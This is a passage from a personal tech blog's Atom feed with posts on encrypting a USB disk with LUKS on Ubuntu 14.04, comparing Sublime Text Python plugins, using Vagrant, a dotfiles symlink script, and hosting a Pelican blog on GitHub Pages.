&lt;/ul&gt;</content><category term="cryptography"></category><category term="GPG"></category><category term="cryptography"></category></entry><entry><title>How to encrypt a removable disk in Ubuntu 14.04</title><link href="https://railslide.io/encrypt-removable-disk-ubuntu-1404.html" rel="alternate"></link><published>2015-04-27T00:00:00+02:00</published><updated>2015-04-27T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2015-04-27:/encrypt-removable-disk-ubuntu-1404.html</id><summary type="html">&lt;p&gt;Most of the guides on how to encrypt a removable disk in Ubuntu still refer to Ubuntu 12.04. Here's how to do it in Ubuntu 14.04 and to cope with the changes it introduces to the disks manager tool.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The other day, while encrypting a USB stick, I discovered that most of the available howtos (including the community wiki) refers to Ubuntu 12.04. So, here's how to do it in Ubuntu 14.04, taking into account the changes that the latest LTS introduced to the disks manager tool.&lt;/p&gt;
&lt;h2&gt;1. Install cryptsetup&lt;/h2&gt;
&lt;p&gt;The first thing you need to do is to install &lt;code&gt;cryptsetup&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;apt-get&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;cryptsetup
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You can also install it from the Software center if you feel more comfortable with a graphical interface.&lt;/p&gt;
&lt;h2&gt;2. Disks manager&lt;/h2&gt;
&lt;p&gt;Launch the disk manager via &lt;em&gt;Dash &amp;gt; Disks&lt;/em&gt; and select the volume you wish to encrypt.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;WARNING: The encryption process will format the volume, so any previously stored data will be wiped off.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In other words,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you have any data on your USB, you probably want to back them up.&lt;/li&gt;
&lt;li&gt;Make sure to select the rigth volume to encrypt, otherwise you could accidentally wipe your hard disk off.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Select the partition, click on the gear icon under it, and choose &lt;code&gt;Format&lt;/code&gt;. Select &lt;code&gt;Overwrite existing data with zeroes (slow)&lt;/code&gt; and &lt;code&gt;Encrypted, compatible with Linux systems (LUKS + ext4)&lt;/code&gt; as type.&lt;/p&gt;
&lt;p&gt;Then insert the passphrase, confirm it, and wait until the process it's complete. Click on the lockpad icon (i.e. to close it) and you're ready to go.&lt;/p&gt;
&lt;h2&gt;Troubleshooting&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;You need to have &lt;code&gt;cryptsetup&lt;/code&gt; installed in order to get &lt;code&gt;LUKS + ext4&lt;/code&gt; option showing up in the list of available system format.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you had the disk manager already open while installing &lt;code&gt;cryptsetup&lt;/code&gt;, you have to restart it in order to see the &lt;code&gt;LUKS + ext4&lt;/code&gt; option.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</content><category term="cryptography"></category><category term="ubuntu"></category><category term="encryption"></category><category term="howto"></category></entry><entry><title>Anaconda VS SublimePythonIDE</title><link href="https://railslide.io/anaconda-vs-sublime-python-ide.html" rel="alternate"></link><published>2015-01-27T00:00:00+01:00</published><updated>2015-01-27T00:00:00+01:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2015-01-27:/anaconda-vs-sublime-python-ide.html</id><summary type="html">&lt;p&gt;When I was looking for a python code linting plugin for Sublime Text 3, I stumbled upon several blog posts mentioning either SublimePythonIDE or Anaconda. The problem was, however, that a comparison between the two was nowhere to be found, so I ended up trying both.&lt;/p&gt;</summary><content type="html">&lt;p&gt;When I was looking for a python code linting plugin for Sublime Text 3, I stumbled upon several blog posts mentioning either &lt;a href="https://github.com/JulianEberius/SublimePythonIDE"&gt;SublimePythonIDE&lt;/a&gt; or &lt;a href="http://damnwidget.github.io/anaconda/"&gt;Anaconda&lt;/a&gt;. The problem was, however, that a comparison between the two was nowhere to be found, so I ended up trying both.&lt;/p&gt;
&lt;p&gt;The first thing that I have to acknowledge is that they are both very good when it comes to code linting and auto completion. So, no matter which one you choose, you can't really go wrong.&lt;/p&gt;
&lt;p&gt;When it comes to the extras SublimePythonIDE is the one that lacks most. Although this certainly comes with with the price of less flexibility, it isn't necessary a negative thing. Indeed, the strength of SublimePythonIDE is that it works out of the box: just make sure that your project settings point to correct interpreter (I delegate that to &lt;a href="http://github.com/Railslide/subvenv"&gt;Subvenv&lt;/a&gt;) and you're ready to go. Without any further effort from your side, SublimePythonIDE will provide you with fancy linting icons on the gutter and colored linting marks. While the same things can be obtained with Anaconda as well, they still require you to read the docs and tinker with the settings.&lt;/p&gt;
&lt;p&gt;Although they require some initial tuning, the extensive amount of customizable settings are not necessarily a negative things, since they offer you the possibility to adjust the way it looks and feel to suite your taste. On top of that Anaconda provides a bunch of handy IDE-like features, such as &lt;code&gt;Go to definition&lt;/code&gt;, &lt;code&gt;Show documentation&lt;/code&gt;, and &lt;code&gt;Find usage&lt;/code&gt; - all reachable via shortcuts or via command palette. It also comes with &lt;a href="https://github.com/hhatto/autopep8"&gt;AutoPEP8&lt;/a&gt;, McCabe complexity checker, and Vagrant integration (via command palette). Recently also a test runner and an import validator has been added to the already reach set of features.&lt;/p&gt;
&lt;p&gt;So which one is the best? It depends. I have settled on Anaconda, since I really enjoy the &lt;code&gt;Go to definition&lt;/code&gt;, &lt;code&gt;Show documentation&lt;/code&gt;, and &lt;code&gt;Find usage&lt;/code&gt; features and use them quite often - especially when dealing with large projects and/or large files. However, if you need a linter that just works and don't want to spend time in playing around with its configuration, SublimePythonIDE is probably the right choice. On the contrary, if you don't mind tinkering a bit with settings files and you are looking for a wider set of IDE-like functions, Anaconda is definitely worthy a shot.&lt;/p&gt;</content><category term="dev"></category><category term="python"></category><category term="sublime text"></category><category term="code linting"></category><category term="tools"></category></entry><entry><title>Hello Vagrant! (aka development environment made easy)</title><link href="https://railslide.io/hello-vagrant.html" rel="alternate"></link><published>2014-09-14T00:00:00+02:00</published><updated>2014-09-14T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2014-09-14:/hello-vagrant.html</id><summary type="html">&lt;p&gt;If you don't use Vagrant yet, you should. Here's why.&lt;/p&gt;</summary><content type="html">&lt;p&gt;For a long time my first step for starting a PHP based project has been to install Xampp on my machine. Xampp provides a considerably easy-to-install full lamp stack - no question about that. However, when I started working on more complicated projects which implied to work together with other developers issues started rising. The main problem was the differences between my local environment and the production one. Add the a further layer of differences for potentially each person involved in the project and it doesn't take much to figure out that moving the result of your work somewhere else than your machine was a guaranteed headache.&lt;/p&gt;
&lt;p&gt;Now imagine a full LAMP stack that gets activated with a command as simple as &lt;code&gt;vagrant up&lt;/code&gt; and takes automatically care of all the dependencies and needed libraries. Add on top of it that it's easily portable and tailored to your needs and you should already have enough reasons for giving Vagrant a try.&lt;/p&gt;
&lt;p&gt;If you are still not fully convinced or just curios, here is a more detailed insight of how Vagrant increases productivity and makes your life so incredibly easier.&lt;/p&gt;
&lt;h2&gt;Exactly what you need&lt;/h2&gt;
&lt;p&gt;Since you are the one provisioning your virtual machine, you get the total freedom of setting it up the way you want. This means that you can have a VM that perfectly replicates your production environment, removing thus all the potentially annoying discrepancies between your local system and the production one.&lt;/p&gt;
&lt;h2&gt;Setup only once&lt;/h2&gt;
&lt;p&gt;All you need for bringing up a VM with Vagrant is just the Vagrantfile and the provision script(s). Once you have those you are just a &lt;code&gt;vagrant up&lt;/code&gt; away from that very machine every time you need it.&lt;/p&gt;
&lt;p&gt;But the coolness doesn't stop here! If you commit the Vagrantfile and the provision scripts together with the rest of your projects files (and I don't see any good reason why you shouldn't), any developer checking out the code will be able to run the same VM on her/his computer.&lt;/p&gt;
&lt;p&gt;This is particularly useful when working in a team, since &lt;em&gt;one person&lt;/em&gt; set up the VM &lt;em&gt;just once&lt;/em&gt; and a whole team benefits from it. Furthermore, thanks to CVS, if someone needs to install a library for carry out her/his job, s/he simply edits the provision file accordingly and commit it. In this way, everyone will get the needed library installed on the VM and so long forgotten dependencies.&lt;/p&gt;
&lt;h2&gt;Develop the way you like&lt;/h2&gt;
&lt;p&gt;Vagrant automatically syncs files between the host and the guest machine. So there's no need to change anything in your beloved setup nor to use something other than your favorite editor. Any file you edit locally in a synced folder will automagically appear in the VM as well, ready to be used.&lt;/p&gt;
&lt;h2&gt;Multiple machines? Not a problem!&lt;/h2&gt;
&lt;p&gt;Vagrant allow you to have multiple VMs within the same project. They can communicate to each other, so that you can accurately reproduce the production environment of your multi-servers killer app. By the way, they are also independent from each other, so no need of bringing them all up when you need to work on only one.&lt;/p&gt;
&lt;h2&gt;Summing up&lt;/h2&gt;
&lt;p&gt;I guess it's pretty obvious that I am a huge fan of Vagrant. It makes my life so much easier (and my working team's too!) and I can no longer imagine my development workflow without it. Finally, the fact that it's also open source it's just the cherry on top.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://vagrantup.com/"&gt;Vagrant homepage&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="dev"></category><category term="vagrant"></category><category term="virtual machine"></category><category term="utilities"></category><category term="dev env"></category></entry><entry><title>Setting up a dotfiles repo and easily port configurations around</title><link href="https://railslide.io/dotfiles.html" rel="alternate"></link><published>2014-07-10T00:00:00+02:00</published><updated>2014-07-10T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2014-07-10:/dotfiles.html</id><summary type="html">&lt;p&gt;How I set up a repository containing my setting and configuration files and delegated the task of creating symlinks to the computer.&lt;/p&gt;</summary><content type="html">&lt;p&gt;After having spent quite some time in finding the right set up for my developing environment, it came natural to look for a way for porting my configuration. Enter a dotfiles repo, aka having all my configurations only one &lt;code&gt;git clone&lt;/code&gt; away and making my life so much easier.&lt;/p&gt;
&lt;p&gt;Michael Smalley wrote an &lt;a href="http://blog.smalleycreative.com/tutorials/using-git-and-github-to-manage-your-dotfiles/"&gt;amazing tutorial&lt;/a&gt; for managing dotfiles and creating a script for automagically installing them (go and check it out!), which provided me with a great starting point. However, his script handles only dotfiles housed in the home directory and that didn't really get together with my goal of adding Sublime Text settings to my dotfiles repo. So I fired up Nano and extended the script in order to make it do exactly what I needed.&lt;/p&gt;
&lt;p&gt;First of all, I needed to to move Sublime configuration files to my dotfiles folder. Thankfully &lt;a href="http://zanshin.net/2013/01/21/sublime-text-2-dotfiles-simplified/"&gt;Mark Nichols' post&lt;/a&gt; tipped me that I the only folder I needed to care about was the User one. So, after cleaning it up from some experiments leftovers, I moved to my dotfiles folder and placed a symlink in its previous location.&lt;/p&gt;
&lt;p&gt;Then I added a variable holding the path to the User directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;sublimedir&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/.config/sublime-text-3/Packages/User
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and at the end of the file the lines taking care of the magic:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# move any existing dotfiles in homedir to dotfiles_old directory, then create symlinks&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;file&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$files&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-a&lt;span class="w"&gt; &lt;/span&gt;~/.&lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;# check if a dotfile already exists&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Moving any existing dotfiles from ~ to &lt;/span&gt;&lt;span class="nv"&gt;$olddir&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;~/.&lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$olddir&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Creating symlink to &lt;/span&gt;&lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="s2"&gt; in home directory.&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;ln&lt;span class="w"&gt; &lt;/span&gt;-s&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$dir&lt;/span&gt;/&lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;~/.&lt;span class="nv"&gt;$file&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...done&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Create symlink for Sublime Text User directory&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# check whether the directory already exists&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-L&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;then&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Removing old symlink&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;rm&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...done&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Moving the existing Sublime Text Users directory from &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;&lt;span class="s2"&gt; to &lt;/span&gt;&lt;span class="nv"&gt;$olddir&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$olddir&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...done&amp;quot;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Creating symlink to User in &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
ln&lt;span class="w"&gt; &lt;/span&gt;-s&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$dir&lt;/span&gt;/sublime/User&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...done&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The full script can be found on &lt;a href="https://github.com/Railslide/dotfiles/blob/master/installdotfiles.sh"&gt;github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Finally, since Package Control updates regularly some of the files in the User folder, I added them to a &lt;code&gt;.gitignore&lt;/code&gt; file in order to avoid to much noise in my version control. A list of those files can be found in the &lt;a href="https://sublime.wbond.net/docs/syncing"&gt;docs&lt;/a&gt; of Package Control.&lt;/p&gt;</content><category term="dev"></category><category term="dotfiles"></category><category term="utilities"></category><category term="git"></category><category term="dev env"></category></entry><entry><title>How to set up Pelican on GitHub pages</title><link href="https://railslide.io/pelican-github-pages.html" rel="alternate"></link><published>2014-06-09T00:00:00+02:00</published><updated>2014-06-09T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2014-06-09:/pelican-github-pages.html</id><summary type="html">&lt;p&gt;How to set up Pelican on GitHUb pages and a custom domain&lt;/p&gt;</summary><content type="html">&lt;p&gt;Although the web is plenty of blog posts about how to set up a Pelican powered blog on GitHub pages, I still had to glean information from several sources and mix it with a bit of experimentation before being able to have my blog up and running. So hopefully this post will make someone's life easier, other than being a future reference for myself.&lt;/p&gt;
&lt;p&gt;Before starting I need to give credit where credit is due, since &lt;a href="http://mathamy.com/migrating-to-github-pages-using-pelican.html"&gt;this post&lt;/a&gt; by Amy Hanlon and &lt;a href="http://martinbrochhaus.com/pelican2.html"&gt;this one&lt;/a&gt; by Martin Brochhaus have been a tremendous starting point for my trial-and-error journey. Once said that, we can start.&lt;/p&gt;
&lt;h1&gt;1. Setting up GitHub project pages&lt;/h1&gt;
&lt;p&gt;GitHub offers the possibility to host your site in the cloud through either &lt;a href="https://help.github.com/articles/user-organization-and-project-pages"&gt;personal or project pages&lt;/a&gt;. Although it is possible to use both for hosting a Pelican powered blog, project pages make your life so much easier when it comes both to publish your blog content and to put blog source under revision control.&lt;/p&gt;
&lt;p&gt;For creating project pages, all we need to do is to create a repository as usual and put the content we wish to publish (i.e. the HTML static files) into a branch named &lt;code&gt;gh-pages&lt;/code&gt;. Once done that, your page will show up at username.github.io/repository.&lt;/p&gt;
&lt;p&gt;Although it could sounds overly complicated - especially the &lt;code&gt;gh-pages&lt;/code&gt; branch part - you don't have to worry since an awesome program called &lt;a href="https://github.com/davisp/ghp-import"&gt;ghp-import&lt;/a&gt; will take care of it for us. For now, simply create a new repository as you would do for any other project and set up a &lt;code&gt;.gitignore&lt;/code&gt; file with the following content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*.pid
*.pyc
output/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1&gt;2. Installing the needed packages&lt;/h1&gt;
&lt;p&gt;Before installing Pelican, I would recommend to create a new virtualenv. It is not mandatory, but it is definitely a good practice and would prevent the risk of conflicts between installed packages.&lt;/p&gt;
&lt;p&gt;NOTE: Pelican documentation recommends to use Pelican with Python 2.7. I am keeping up with &lt;a href="https://railslide.io/virtualenvwrapper-python3.html"&gt;my pledge of using Python 3 whenever possible&lt;/a&gt;, as well as giving a try with Python 3.4 (Ubuntu 14.04 default version). Everything works fine so far and anyways these instructions are version agnostic - just be aware of it and choose your Python version accordingly.&lt;/p&gt;
&lt;p&gt;Install pelican and ghp-import&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pip&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;pelican
pip&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;-e&lt;span class="w"&gt; &lt;/span&gt;git+git://github.com/davisp/ghp-import.git#egg&lt;span class="o"&gt;=&lt;/span&gt;ghp-import
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Next run &lt;code&gt;pelican-quickstart&lt;/code&gt; and get ready to answer to a bunch of questions. Most of them are pretty straightforward and anyway you'll be able to change them later in your settings files. These are the only ones you need to care about for the moment:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Where&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;create&lt;span class="w"&gt; &lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;new&lt;span class="w"&gt; &lt;/span&gt;web&lt;span class="w"&gt; &lt;/span&gt;site?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;.&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# Press enter&lt;/span&gt;
Do&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;specify&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;URL&lt;span class="w"&gt; &lt;/span&gt;prefix?&lt;span class="w"&gt; &lt;/span&gt;e.g.,&lt;span class="w"&gt; &lt;/span&gt;http://example.com&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;Y/n&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y&lt;/span&gt;
What&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;URL&lt;span class="w"&gt; &lt;/span&gt;prefix?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;see&lt;span class="w"&gt; &lt;/span&gt;above&lt;span class="w"&gt; &lt;/span&gt;example&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;no&lt;span class="w"&gt; &lt;/span&gt;trailing&lt;span class="w"&gt; &lt;/span&gt;slash&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# http://username.github.io/repository&lt;/span&gt;
Do&lt;span class="w"&gt; &lt;/span&gt;you&lt;span class="w"&gt; &lt;/span&gt;want&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;generate&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;Fabfile/Makefile&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;automate&lt;span class="w"&gt; &lt;/span&gt;generation&lt;span class="w"&gt; &lt;/span&gt;and&lt;span class="w"&gt; &lt;/span&gt;publishing?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;Y/n&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Answer &lt;code&gt;n&lt;/code&gt; to all the questions about uploading your website and you are ready to go.&lt;/p&gt;
&lt;h1&gt;3. Writing content&lt;/h1&gt;
&lt;p&gt;Fire up your favorite text editor and write your blog content in either Markdown or reStructuredText. Once you have done, save it in the content folder. For previewing it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;make&lt;span class="w"&gt; &lt;/span&gt;devserver
&lt;span class="c1"&gt;# go to http://localhost:8000 and check if everything looks good&lt;/span&gt;
^C&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# note that CTRL+C won&amp;#39;t stop dev server&lt;/span&gt;
./develop_server.sh&lt;span class="w"&gt; &lt;/span&gt;stop&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# manually stop the dev server&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1&gt;4. Publishing and pushing&lt;/h1&gt;
&lt;p&gt;Ok this is the easy part.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# pushing the source repo&lt;/span&gt;
git&lt;span class="w"&gt; &lt;/span&gt;push&lt;span class="w"&gt; &lt;/span&gt;origin&lt;span class="w"&gt; &lt;/span&gt;master

&lt;span class="c1"&gt;# push the output folder to GitHub pages&lt;/span&gt;
make&lt;span class="w"&gt; &lt;/span&gt;github

&lt;span class="c1"&gt;# celebrate!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Congrats! Your blog is now up and running!&lt;/p&gt;
&lt;h1&gt;5. Setting up your custom domain&lt;/h1&gt;
&lt;p&gt;Create a CNAME file containing your bare domain:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mydomain.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Add the following lines to your pelicanconf.py, in order to make Pelican copying it to your output folder on every publish.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;STATIC_PATHS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;CNAME&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then, assuming that you want both mydomain.com and www.mydomain.com to point at your blog, you need to set &lt;strong&gt;both the CNAME and the A-records&lt;/strong&gt; of your domain to point at github.&lt;/p&gt;
&lt;p&gt;Since this has been the most problematic step for me, here's a couple of extra thoughts regarding my domain registrar (Gandi):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Make sure to not have any other A-record&lt;/li&gt;
&lt;li&gt;Using Gandi's web forwarding instead of setting both the CNAME and the A-records resulted in a redirect loop error&lt;/li&gt;
&lt;li&gt;You can take the rest of the zone file data from Gandi's default one&lt;/li&gt;
&lt;li&gt;Testing from different browsers and refreshing several times can help spotting some very sneaky bugs&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/a/22374542/2926113"&gt;This answer&lt;/a&gt; from Stack Overflow provides great step-by-step instructions for using GitHub project pages with a custom domain&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here are the lines taking care of the magic in my case:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www 10800 IN CNAME railslide.github.io.
@ 10800 IN A 192.30.252.153
@ 10800 IN A 192.30.252.154
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

